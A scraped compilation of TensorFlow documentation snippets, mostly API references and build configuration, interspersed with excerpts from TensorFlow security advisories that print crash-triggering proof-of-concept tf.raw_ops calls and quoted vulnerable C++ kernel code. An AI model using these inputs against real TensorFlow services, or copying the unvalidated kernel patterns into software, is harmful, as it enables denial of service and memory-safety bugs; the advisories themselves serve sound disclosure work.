!curl -L https://github.com/tensorflow/tflite-support/raw/master/tensorflow_lite_support/metadata/python/tests/testdata/nl_classifier/labels.txt -o movie_review_labels.txt
!curl -L https://storage.googleapis.com/download.tensorflow.org/models/tflite_support/nl_classifier/vocab.txt -o movie_review_vocab.txt
```

----------------------------------------

TITLE: Retrieving AssociatedFile Version (Python)
DESCRIPTION: Retrieves the version string associated with the `AssociatedFile`, indicating the format or content version. This method takes no arguments. It returns a string representing the version information.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/AssociatedFile.md#_snippet_8

LANGUAGE: python
CODE:
```
Version()
```

----------------------------------------

TITLE: Accessing Empty Tensor Element in MatrixDiagV Kernel (C++)
DESCRIPTION: This C++ snippet from the `matrix_diag_op.cc` kernel shows the problematic code location. It retrieves the tensor corresponding to the `k` input (`diag_index`, input index 1) and attempts to access its first element using `diag_index.flat<int32>()(0)`. If the input tensor for `k` is empty, this access leads to the nullptr binding and undefined behavior described in the vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-131.md#_snippet_1

LANGUAGE: C++
CODE:
```
  auto& diag_index = context->input(1);
  ...
  lower_diag_index = diag_index.flat<int32>()(0);
```

----------------------------------------

TITLE: Initializing InputAudioTensorMd class in Python
DESCRIPTION: Initializes a `InputAudioTensorMd` object with specified metadata for an input audio tensor. Parameters include the tensor's name, description, sample rate, and channel count.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/InputAudioTensorMd.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_writers.metadata_info.InputAudioTensorMd(
    name: Optional[str] = None,
    description: Optional[str] = None,
    sample_rate: int = 0,
    channels: int = 0
)
```

----------------------------------------

TITLE: Defining Variable Handle - TensorFlow GraphDef
DESCRIPTION: This node defines a handle resource for a mutable variable within the TensorFlow graph. It specifies the variable's name, operation type ('VarHandleOp'), data type (float), and an empty shape, indicating it will hold a single value or its shape is dynamic.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tf2xla/api/v2/testdata/graph_with_flib_def.txt#_snippet_0

LANGUAGE: TensorFlow GraphDef
CODE:
```
node {
  name: "Variable"
  op: "VarHandleOp"
  attr {
    key: "_output_shapes"
    value {
      list {
        shape {
        }
      }
    }
  }
  attr {
    key: "debug_name"
    value {
      s: "Variable/"
    }
  }
  attr {
    key: "dtype"
    value {
      type: DT_FLOAT
    }
  }
  attr {
    key: "shape"
    value {
      shape {
      }
    }
  }
  attr {
    key: "shared_name"
    value {
      s: "Variable"
    }
  }
}
```

----------------------------------------

TITLE: Get Default Quantization Config Python
DESCRIPTION: Retrieves the default quantization configuration for the model specification. This method requires representative data to configure the quantization process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/ModelSpec.md#_snippet_1

LANGUAGE: python
CODE:
```
get_default_quantization_config(\n    representative_data\n)
```

----------------------------------------

TITLE: Loading Metadata and Associated Files from Another Model Buffer - Python
DESCRIPTION: This method populates the current MetadataPopulator object with metadata and associated files extracted from a source TensorFlow Lite model buffer. The source buffer should already contain metadata and associated files. This allows transferring existing metadata from one model to another.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata/MetadataPopulator.md#_snippet_8

LANGUAGE: Python
CODE:
```
load_metadata_and_associated_files(
    src_model_buf
)
```

----------------------------------------

TITLE: Declaring TFLite Micro Op Resolver and Registration (C++)
DESCRIPTION: Defines a type alias `HelloWorldOpResolver` for a mutable operation resolver, specialized to handle a fixed number of operations (in this case, 1). It also declares a `RegisterOps` function responsible for adding the specific operations required by the model (e.g., Fully Connected) to the resolver.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/get_started_low_level.md#_snippet_6

LANGUAGE: C++
CODE:
```
using HelloWorldOpResolver = tflite::MicroMutableOpResolver<1>;

TfLiteStatus RegisterOps(HelloWorldOpResolver& op_resolver) {
  TF_LITE_ENSURE_STATUS(op_resolver.AddFullyConnected());
  return kTfLiteOk;


```

----------------------------------------

TITLE: Exporting Model (Python)
DESCRIPTION: Converts and exports the trained model to various formats (TFLite, SavedModel, TFJS, labels, vocabulary) into a specified directory. Allows custom filenames for the exported assets and takes a list of desired export formats. Additional arguments can be passed for specific formats like quantization configuration for TFLite.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/TextClassifier.md#_snippet_6

LANGUAGE: python
CODE:
```
export(
    export_dir,
    tflite_filename='model.tflite',
    label_filename='labels.txt',
    vocab_filename='vocab.txt',
    saved_model_filename='saved_model',
    tfjs_folder_name='tfjs',
    export_format=None,
    **kwargs
)
```

----------------------------------------

TITLE: Example MLIR Before Tensor List Decomposition (TF Dialect)
DESCRIPTION: Shows an example MLIR function `main` demonstrating the use of TensorFlow tensor list creation (`tf.EmptyTensorList`) and modification (`tf.TensorListPushBack`) operations before they are decomposed into tensor-based operations.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_44

LANGUAGE: MLIR
CODE:
```
func @main(%arg0: tensor<8x4xf32>) {
  %elem_shape = "tf.Const"() {value = dense<[8, 4]> : tensor<2xi32>} : () -> tensor<2xi32>
  %max_size = "tf.Const"() {value = dense<10> : tensor<i32>} : () -> tensor<i32>
  %tl = "tf.EmptyTensorList"(%elem_shape, %max_size) : (tensor<2xi32>, tensor<i32>) -> tensor<!tf_type.variant<tensor<8x4xf32>>>
  %push = "tf.TensorListPushBack"(%tl, %arg0) : (tensor<!tf_type.variant<tensor<8x4xf32>>>, tensor<8x4xf32>) -> tensor<!tf_type.variant<tensor<8x4xf32>>>
  return
}
```

----------------------------------------

TITLE: Configuring TensorFlow Lite Python Wrapper Build - CMake
DESCRIPTION: This snippet defines various build properties for the `_pywrap_tensorflow_interpreter_wrapper` CMake target. It removes the default 'lib' prefix, adds public include directories, specifies libraries to link (tensorflow-lite, CMAKE_DL_LIBS), and sets public/private compile options using predefined variables.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_33

LANGUAGE: CMake
CODE:
```
# To remove "lib" prefix.
set_target_properties(_pywrap_tensorflow_interpreter_wrapper PROPERTIES PREFIX "")

target_include_directories(_pywrap_tensorflow_interpreter_wrapper
  PUBLIC
    ${TENSORFLOW_SOURCE_DIR}
)

target_link_libraries(_pywrap_tensorflow_interpreter_wrapper
  tensorflow-lite
  ${CMAKE_DL_LIBS}
)
target_compile_options(_pywrap_tensorflow_interpreter_wrapper
  PUBLIC ${TFLITE_TARGET_PUBLIC_OPTIONS}
  PRIVATE ${TFLITE_TARGET_PRIVATE_OPTIONS}
)
```

----------------------------------------

TITLE: Triggering TensorListReserve Vulnerability (Python)
DESCRIPTION: This Python code snippet demonstrates the vulnerability in TensorFlow's `tf.raw_ops.TensorListReserve`. It calls the operation with a `num_elements` argument that is a tensor containing more than one element, which is not handled correctly and leads to a crash or error in the underlying C++ code. This requires a vulnerable version of TensorFlow to reproduce the issue.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-088.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.TensorListReserve(element_shape=(1,1), num_elements=tf.constant([1,1], dtype=tf.int32), element_dtype=tf.int8)
```

----------------------------------------

TITLE: Adding TFLite Task Text Dependency Gradle Java
DESCRIPTION: Adds the necessary TensorFlow Lite Task Library text dependency and the optional GPU delegate plugin to the Android module's build.gradle file. It also configures aaptOptions to prevent compression of .tflite files (though noted as potentially unnecessary in newer AGP versions).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/nl_classifier.md#_snippet_0

LANGUAGE: Java
CODE:
```
android {
    // Other settings

    // Specify tflite file should not be compressed for the app apk
    aaptOptions {
        noCompress "tflite"
    }

}

dependencies {
    // Other dependencies

    // Import the Task Vision Library dependency (NNAPI is included)
    implementation 'org.tensorflow:tensorflow-lite-task-text:0.4.4'
    // Import the GPU delegate plugin Library for GPU inference
    implementation 'org.tensorflow:tensorflow-lite-gpu-delegate-plugin:0.4.4'
}
```

----------------------------------------

TITLE: Demonstrating AvgPoolGrad Vulnerability in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates the TensorFlow `AvgPoolGrad` vulnerability (CVE-2022-35968). It calls `tf.raw_ops.AvgPoolGrad` with a negative value for `orig_input_shape`, which is not properly validated, leading to a `CHECK` failure and denial of service. Requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-100.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

ksize = [1, 2, 2, 1]
strides = [1, 2, 2, 1]
padding = "VALID"
data_format = "NHWC"
orig_input_shape = tf.constant(-536870912, shape=[4], dtype=tf.int32)
grad = tf.constant(.0890338004362538, shape=[1,5,7,1], dtype=tf.float64)
tf.raw_ops.AvgPoolGrad(orig_input_shape=orig_input_shape, grad=grad, ksize=ksize, strides=strides, padding=padding, data_format=data_format)
```

----------------------------------------

TITLE: Add Custom Files to Bazel BUILD Rule - Bazel
DESCRIPTION: Example of how to modify the `filegroup` rule in the Bazel BUILD file (`tensorflow/lite/java/ovic/src/testdata/BUILD`) to include your custom model and test image files. This makes them available as dependencies for tests and the benchmarker app.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/java/ovic/README.md#_snippet_8

LANGUAGE: bazel
CODE:
```
filegroup(
    name = "ovic_testdata",
    srcs = [
        "@tflite_ovic_testdata//:detect.lite",
        "@tflite_ovic_testdata//:float_model.lite",
        "@tflite_ovic_testdata//:low_res_model.lite",
        "@tflite_ovic_testdata//:quantized_model.lite",
        "@tflite_ovic_testdata//:test_image_128.jpg",
        "@tflite_ovic_testdata//:test_image_224.jpg",
        "my_model.lite",        # <--- Your submission.
        "my_test_image.jpg",    # <--- Your test image.
    ],
    ...
```

----------------------------------------

TITLE: Create MetadataWriter from Flatbuffers - TFLite Support - Python
DESCRIPTION: Creates a MetadataWriter object using existing metadata represented as Flatbuffers Python objects. This method provides fine-grained control over the metadata structure by allowing the specification of model, input, output, associated files, and process unit metadata as Flatbuffers objects, and returns a MetadataWriter.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/object_detector/MetadataWriter.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
create_from_metadata(
    model_buffer: bytearray,
    model_metadata: Optional[tflite_support.metadata_schema_py_generated.ModelMetadataT] = None,
    input_metadata: Optional[List[_metadata_fb.TensorMetadataT]] = None,
    output_metadata: Optional[List[_metadata_fb.TensorMetadataT]] = None,
    associated_files: Optional[List[str]] = None,
    input_process_units: Optional[List[_metadata_fb.ProcessUnitT]] = None,
    output_process_units: Optional[List[_metadata_fb.ProcessUnitT]] = None
)
```

----------------------------------------

TITLE: Accessing Tensor Values in TensorFlow MatrixDiag C++ Kernel
DESCRIPTION: This C++ snippet shows how input tensor elements are accessed within the `MatrixDiag*` kernel implementation. It demonstrates accessing the first element of `int32` and `T` tensors using `flat<Type>()(0)`. The lack of validation for empty tensors when accessing elements this way is the root cause of the null pointer dereference vulnerability.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-004.md#_snippet_0

LANGUAGE: C++
CODE:
```
      num_rows = context->input(2).flat<int32>()(0);
      num_cols = context->input(3).flat<int32>()(0);
      padding_value = context->input(4).flat<T>()(0);
```

----------------------------------------

TITLE: Calculating Input Item Bytes - TFLite C++
DESCRIPTION: This C++ snippet from the TFLite LSH kernel shows a function `RunningSignBit` that calculates the number of bytes per item in the input tensor. The vulnerability lies in the division where the size of the first dimension (`SizeOfDimension(input, 0)`) is not checked for being non-zero, leading to a division-by-zero error if the input tensor's first dimension is zero.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-164.md#_snippet_0

LANGUAGE: C++
CODE:
```
int RunningSignBit(const TfLiteTensor* input, const TfLiteTensor* weight,
                   float seed) {
  int input_item_bytes = input->bytes / SizeOfDimension(input, 0);
  // ...
}
```

----------------------------------------

TITLE: Triggering Incomplete Validation in MKL RequantizationRangePerChannel (Python)
DESCRIPTION: This Python snippet demonstrates calling the `tf.raw_ops.RequantizationRangePerChannel` operation with an empty `input` tensor. This specific call highlights a vulnerability in the MKL implementation where the input dimensions are not properly validated, potentially leading to undefined behavior or out-of-bounds memory access. It requires the TensorFlow library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-139.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.RequantizationRangePerChannel(
  input=[],
  input_min=[0,0,0,0,0],
  input_max=[1,1,1,1,1],
  clip_value_max=1)
```

----------------------------------------

TITLE: Handling AutoGraph Conversion Warnings for Generators (Python)
DESCRIPTION: This snippet illustrates AutoGraph's behavior when it encounters unsupported Python features, such as generator functions, within code intended for conversion. AutoGraph issues a warning indicating that the problematic entity will not be converted and will instead be executed as standard Python code. The rest of the `@tf.function` might still be converted if possible.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/error_handling.md#_snippet_2

LANGUAGE: Python
CODE:
```
def example_generator():
  yield 1

@tf.function
def f():
  for i in example_generator():
    print(i)
```

----------------------------------------

TITLE: Loading TensorAudio from NumPy Array in Python
DESCRIPTION: Loads audio data into the `TensorAudio` instance's buffer from a given NumPy array. This method allows specifying an optional `offset` and `size` to load only a slice of the source array.
It checks the dimensions and size of the source array against the buffer capacity, raising a `ValueError` if the input is invalid or exceeds the buffer's bounds.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/TensorAudio.md#_snippet_3

LANGUAGE: Python
CODE:
```
load_from_array(
    src: np.ndarray, offset: int = 0, size: int = -1
) -> None
```

----------------------------------------

TITLE: Demonstrating ThreadUnsafeUnigramCandidateSampler Heap OOB Python
DESCRIPTION: This snippet shows a call to `tf.raw_ops.ThreadUnsafeUnigramCandidateSampler` with parameters designed to trigger the heap out-of-bounds vulnerability (CVE-2022-41880). Specifically, `true_classes` is set to `[[0x100000, 1]]` while `range_max` is set to `2`, violating the expected condition and causing the error. This demonstrates the vulnerable state before patching.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-144.md#_snippet_0

LANGUAGE: python
CODE:
```
tf.raw_ops.ThreadUnsafeUnigramCandidateSampler(
    true_classes=[[0x100000,1]],
    num_true = 2,
    num_sampled = 2,
    unique = False,
    range_max = 2,
    seed = 2,
    seed2 = 2)
```

----------------------------------------

TITLE: Setting C++ Standard
DESCRIPTION: This snippet sets the required C++ standard to C++20 and ensures that this standard is enforced by the compiler.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_7

LANGUAGE: CMake
CODE:
```
set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
```

----------------------------------------

TITLE: Showing TensorFlow UnsortedSegmentJoin Vulnerable Code (C++)
DESCRIPTION: This C++ snippet from the `UnsortedSegmentJoin` kernel illustrates the lack of validation for the `num_segments` input. The value is read directly from the input tensor and used to calculate the output shape without checking if it's non-negative, leading to a CHECK-failure when a negative value is provided.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-078.md#_snippet_1

LANGUAGE: cpp
CODE:
```
const Tensor& num_segments_tensor = context->input(2);
auto num_segments = num_segments_tensor.scalar<NUM_SEGMENTS_TYPE>()();
// ...
Tensor* output_tensor = nullptr;
TensorShape output_shape =
    GetOutputShape(input_shape, segment_id_shape, num_segments);
```

----------------------------------------

TITLE: Calculating TransposeConv Dimensions in TFLite (Vulnerable)
DESCRIPTION: This C++ snippet shows the lines of code within the optimized TFLite `TransposeConv` implementation where division by zero can occur. It calculates output dimensions (`height_col`, `width_col`) based on input dimensions, padding, filter size, and strides. If `stride_h` or `stride_w` are zero, this calculation leads to a division by zero error.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-077.md#_snippet_0

LANGUAGE: C++
CODE:
```
int height_col = (height + pad_t + pad_b - filter_h) / stride_h + 1;
int width_col = (width + pad_l + pad_r - filter_w) / stride_w + 1;
```

----------------------------------------

TITLE: Configuring GPU Delegate in Task Options (Java)
DESCRIPTION: This Java snippet demonstrates how to configure and enable GPU delegation for a TensorFlow Lite Task Library task, using `ObjectDetector` as an example. It shows how to create `BaseOptions` with GPU enabled and then build the task-specific options and task instance using these base options.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/overview.md#_snippet_1

LANGUAGE: Java
CODE:
```
// Turn on GPU delegation.
BaseOptions baseOptions = BaseOptions.builder().useGpu().build();
// Configure other options in ObjectDetector
ObjectDetectorOptions options =
    ObjectDetectorOptions.builder()
        .setBaseOptions(baseOptions)
        .setMaxResults(1)
        .build();

// Create ObjectDetector from options.
ObjectDetector objectDetector =
    ObjectDetector.createFromFileAndOptions(context, modelFile, options);

// Run inference
List<Detection> results = objectDetector.detect(image);
```

----------------------------------------

TITLE: Populating TFLite Model with Metadata (Python)
DESCRIPTION: This Python snippet demonstrates how to embed the generated metadata buffer and associated files (like label files) directly into a TFLite model file. It uses the `MetadataPopulator` class from the TFLite Support library, loading the metadata buffer and specifying the paths to files that should be packed into the model. Requires the `tensorflow_lite_support.metadata.python` library.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata.md#_snippet_7

LANGUAGE: python
CODE:
```
populator = _metadata.MetadataPopulator.with_model_file(model_file)
populator.load_metadata_buffer(metadata_buf)
populator.load_associated_files(["your_path_to_label_file"])
populator.populate()
```

----------------------------------------

TITLE: Demonstrating TensorFlow SparseAdd Vulnerability (Python)
DESCRIPTION: This snippet provides a minimal example in Python to demonstrate the incomplete validation vulnerability in `tf.raw_ops.SparseAdd`. It constructs invalid sparse tensor inputs by providing incorrect shapes and empty tensors, triggering undefined behavior in vulnerable TensorFlow versions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-096.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

a_indices = tf.zeros([10, 97], dtype=tf.int64)
a_values = tf.zeros([10], dtype=tf.int64)
a_shape = tf.zeros([0], dtype=tf.int64)

b_indices = tf.zeros([0, 0], dtype=tf.int64)
b_values = tf.zeros([0], dtype=tf.int64)
b_shape = tf.zeros([0], dtype=tf.int66)

thresh = 0

tf.raw_ops.SparseAdd(a_indices=a_indices,
                    a_values=a_values,
                    a_shape=a_shape,
                    b_indices=b_indices,
                    b_values=b_values,
                    b_shape=b_shape,
                    thresh=thresh)
```

----------------------------------------

TITLE: Triggering TensorFlow v1 Quantized Type Segfault - Python
DESCRIPTION: This Python snippet demonstrates how to trigger a segfault in vulnerable versions of TensorFlow by calling `tf.compat.v1.placeholder_with_default` with a shape argument defined using `tf.constant` and the `tf.qint8` quantized data type. This specific combination, lacking kernel support, causes a null pointer dereference leading to a crash.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-073.md#_snippet_0

LANGUAGE: Python
CODE:
```
import numpy as np
import tensorflow as tf

tf.compat.v1.placeholder_with_default(input=np.array([2]),shape=tf.constant(dtype=tf.qint8, value=np.array([1])))
```

----------------------------------------

TITLE: Initializing TensorShape Dimensions in TensorFlow C++
DESCRIPTION: This C++ snippet from `tensor_shape.cc` shows the `InitDims` function. It iterates through the provided dimension sizes (`dim_sizes`) and attempts to add each dimension using `AddDimWithStatus`. It accumulates and propagates the status, allowing `CHECK` in the constructor to catch errors like overflow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-012.md#_snippet_3

LANGUAGE: cpp
CODE:
```
template <class Shape>
Status TensorShapeBase<Shape>::InitDims(gtl::ArraySlice<int64> dim_sizes) {
  ...
  Status status = OkStatus();
  for (int64 s : dim_sizes) {
    status.Update(AddDimWithStatus(internal::SubtleMustCopy(s)));
    if (!status.ok()) {
      return status;
    }
  }
}
```

----------------------------------------

TITLE: Enable GPU Acceleration with Task Library (Google Play Services) - Java
DESCRIPTION: Asynchronously checks if the GPU delegate is available via Google Play services and configures the BaseOptions for a Task API model (like ObjectDetector) to use the GPU if available. This prepares the options object before creating the detector instance.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/gpu_task.md#_snippet_2

LANGUAGE: Java
CODE:
```
Task<Boolean> useGpuTask = TfLiteGpu.isGpuDelegateAvailable(context);

Task<ObjectDetectorOptions> optionsTask = useGpuTask.continueWith({ task ->
  BaseOptions baseOptionsBuilder = BaseOptions.builder();
  if (task.getResult()) {
    baseOptionsBuilder.useGpu();
  }
  return ObjectDetectorOptions.builder()
          .setBaseOptions(baseOptionsBuilder.build())
          .setMaxResults(1)
          .build()
});
```

----------------------------------------

TITLE: Inspecting Full Integer Quantized TFLite Model Input Output Types Python
DESCRIPTION: Creates a TensorFlow Lite Interpreter instance using the fully integer quantized model content. It retrieves the details of the model's input and output tensors and prints their respective data types (`dtype`). This confirms that the input and output tensors are now in integer format (uint8), suitable for integer-only hardware.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant.ipynb#_snippet_7

LANGUAGE: python
CODE:
```
interpreter = tf.lite.Interpreter(model_content=tflite_model_quant)
input_type = interpreter.get_input_details()[0]['dtype']
print('input: ', input_type)
output_type = interpreter.get_output_details()[0]['dtype']
print('output: ', output_type)
```

----------------------------------------

TITLE: Triggering Heap OOB in QuantizeAndDequantizeV3 (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger a heap out-of-bounds read vulnerability in TensorFlow's `QuantizeAndDequantizeV3` operation by providing an invalid `axis` value (3 in this case, which is out of bounds for the 1D input tensor). It shows the minimal parameters needed to reproduce the issue using `tf.raw_ops`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-040.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.raw_ops.QuantizeAndDequantizeV3(
  input=[2.5,2.5], input_min=[0,0], input_max=[1,1], num_bits=[30],
  signed_input=False, range_given=False, narrow_range=False, axis=3)
```

----------------------------------------

TITLE: Adding TensorFlow Lite C API Library Target - CMake
DESCRIPTION: Defines a library target named `tensorflowlite_c` using the determined `TFLITE_C_LIBTYPE`. It lists all the C++ and header files that constitute the TensorFlow Lite C API, including source files from the main TFLite directory and locally defined headers.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/c/CMakeLists.txt#_snippet_8

LANGUAGE: CMake
CODE:
```
add_library(tensorflowlite_c ${TFLITE_C_LIBTYPE}
  ${TFLITE_SOURCE_DIR}/core/c/c_api.cc
  ${TFLITE_SOURCE_DIR}/core/c/c_api_experimental.cc
  ${TFLITE_SOURCE_DIR}/core/c/common.cc
  ${TFLITE_SOURCE_DIR}/core/c/operator.cc
  ${TF_SOURCE_DIR}/tensorflow/compiler/mlir/lite/core/c/tflite_types.h
  builtin_op_data.h
  c_api.h
  c_api_experimental.h
  c_api_internal.h
  c_api_types.h
  common.h
)
```

----------------------------------------

TITLE: Creating IndexTable (string->int64) from Tensor - Python
DESCRIPTION: Illustrates creating a tf.lookup.index_table_from_tensor to map strings to indices (int64), providing a default value for unknown words. It sets up a vocabulary tensor, creates the index table, defines a placeholder for string input, and sets up the lookup operation with table initialization dependency.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/kernels/hashtable.md#_snippet_2

LANGUAGE: Python
CODE:
```
UNK_ID = -1
vocab = tf.constant(["emerson", "lake", "palmer"])
vocab_table = tf.lookup.index_table_from_tensor(vocab, default_value=UNK_ID)

input_tensor = tf.compat.v1.placeholder(tf.string, shape=[5])

with tf.control_dependencies([tf.initializers.tables_initializer()]):
  out_tensor = vocab_table.lookup(input_tensor)
```

----------------------------------------

TITLE: Define YamNet Model Specification Python
DESCRIPTION: Creates a `YamNetSpec` object to define the base model architecture and processing parameters for transfer learning. It configures the model to retain both the original YAMNet head and add a new custom head for fine-tuning, setting specific `frame_step` and `frame_length` based on `EXPECTED_WAVEFORM_LENGTH` for segmenting audio.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/audio_classification.ipynb#_snippet_6

LANGUAGE: python
CODE:
```
spec = audio_classifier.YamNetSpec(
    keep_yamnet_and_custom_heads=True,
    frame_step=3 * audio_classifier.YamNetSpec.EXPECTED_WAVEFORM_LENGTH,
    frame_length=6 * audio_classifier.YamNetSpec.EXPECTED_WAVEFORM_LENGTH)
```

----------------------------------------

TITLE: Triggering Type Confusion with convert_to_tensor / TensorFlow / Python
DESCRIPTION: This Python snippet directly demonstrates triggering the CVE-2021-29513 vulnerability by explicitly converting a NumPy array to a TensorFlow tensor using `tf.convert_to_tensor` with `dtype=tf.resource`. This explicit conversion of a standard numeric type to a non-numeric TensorFlow resource type exposes the vulnerable code path in the Python-to-C++ data conversion layer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2021-003.md#_snippet_5

LANGUAGE: python
CODE:
```
import tensorflow as tf
import numpy as np

writer_array = np.array([1,2],dtype=np.int32)
writer_tensor = tf.convert_to_tensor(writer_array,dtype=tf.resource)
```

----------------------------------------

TITLE: Converting TensorFlow GraphDef using TFLiteConverter (Python)
DESCRIPTION: This method performs the actual conversion of a TensorFlow GraphDef model based on the instance variables and configurations set on the `TFLiteConverter` object. It returns the converted model data in a serialized format. Conversion may fail if the model configuration is invalid, raising a `ValueError` for issues like missing concrete functions, undefined input shapes, or incorrect quantization parameters.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/TFLiteConverter.md#_snippet_5

LANGUAGE: Python
CODE:
```
convert()
```

----------------------------------------

TITLE: Configuring CameraX ImageAnalysis (Kotlin)
DESCRIPTION: Builds an `ImageAnalysis` instance for CameraX, specifying properties like target aspect ratio, rotation, backpressure strategy, and output image format. This object is used to acquire image frames from the camera for subsequent processing. Requires CameraX dependencies (`androidx.camera`).
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/object_detection.md#_snippet_8

LANGUAGE: Kotlin
CODE:
```
imageAnalyzer =
    ImageAnalysis.Builder()
        .setTargetAspectRatio(AspectRatio.RATIO_4_3)
        .setTargetRotation(fragmentCameraBinding.viewFinder.display.rotation)
        .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
        .setOutputImageFormat(OUTPUT_IMAGE_FORMAT_RGBA_8888)
        .build()
        ...
```

----------------------------------------

TITLE: Saving TensorFlow Model with Experimental Image Format (Python)
DESCRIPTION: This Python snippet demonstrates how to save a TensorFlow model while enabling the experimental SavedModel image format. By setting `experimental_image_format=True` in the `tf.savedmodel.SaveOptions`, the model will be saved using the new `.cpb` format instead of `.pb` if its proto size exceeds 2GB. This option is used with the `tf.savedmodel.save` function, requiring the `model` object and the save `path`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/cc/saved_model/image_format/README.md#_snippet_0

LANGUAGE: python
CODE:
```
tf.savedmodel.save(
    model, path,
    options=tf.savedmodel.SaveOptions(experimental_image_format=True)
)
```

----------------------------------------

TITLE: Adding SentencePiece Model to Options in TFLite Support Python
DESCRIPTION: This function adds the byte content of a SentencePiece model to the SentencePiece tokenizer options using a FlatBuffers builder. It is a utility function typically used when programmatically building metadata FlatBuffers for a TFLite model. The function takes the FlatBuffers builder object and the byte array of the SentencePiece model as inputs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SentencePieceTokenizerOptionsAddSentencePieceModel.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.SentencePieceTokenizerOptionsAddSentencePieceModel(
    builder, sentencePieceModel
)
```

----------------------------------------

TITLE: Downloading Background Audio Datasets Python
DESCRIPTION: Uses `tf.keras.utils.get_file` to download two archive files containing background noise samples: the speech commands dataset (v0.01) and a separate background audio collection. These files are cached and extracted into specified local directories, providing necessary negative samples for training.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/speech_recognition.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
tf.keras.utils.get_file('speech_commands_v0.01.tar.gz',
                        'http://download.tensorflow.org/data/speech_commands_v0.01.tar.gz',
                        cache_dir='./',
                        cache_subdir='dataset-speech',
                        extract=True)
tf.keras.utils.get_file('background_audio.zip',
                        'https://storage.googleapis.com/download.tensorflow.org/models/tflite/sound_classification/background_audio.zip',
                        cache_dir='./',
                        cache_subdir='dataset-background',
                        extract=True)

```

----------------------------------------

TITLE: Adding Index to Bounding Box Properties using TFLite Support Python
